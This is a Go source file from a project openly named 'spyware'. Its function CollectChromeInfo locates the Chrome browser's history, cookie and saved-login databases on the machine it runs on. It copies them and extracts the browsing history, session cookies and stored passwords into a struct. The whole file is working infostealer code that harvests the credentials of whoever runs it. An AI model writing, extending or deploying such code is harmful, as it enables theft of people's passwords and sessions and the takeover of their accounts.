package collectors

import (
	"log"

	"github.com/Nevesto/spyware/browsers/chrome"
	"github.com/Nevesto/spyware/models"
)

func CollectChromeInfo() models.ChromeInfo {
	var info models.ChromeInfo

	historyFile, err := chrome.FindHistoryFile()
	if err == nil && historyFile != "" {
		tmpHistoryFile, err := chrome.CopyFile(historyFile)
		if err == nil {
			info.History, _ = chrome.ReadHistory(tmpHistoryFile)
		}
	}

	cookieFile, err := chrome.FindCookieFile()
	if err == nil && cookieFile != "" {
		tmpCookieFile, err := chrome.CopyFile(cookieFile)
		if err == nil {
			info.Cookies, _ = chrome.ReadCookies(tmpCookieFile)
		}
	}

	loginDataFile, err := chrome.FindLoginDataFile()
	if err == nil && loginDataFile != "" {
		passwords, err := chrome.ReadPasswords(loginDataFile)
		if err != nil {
			log.Printf("Error reading Chrome passwords: %v", err)
		} else {
			info.Passwords = passwords
		}
	}

	return info
}
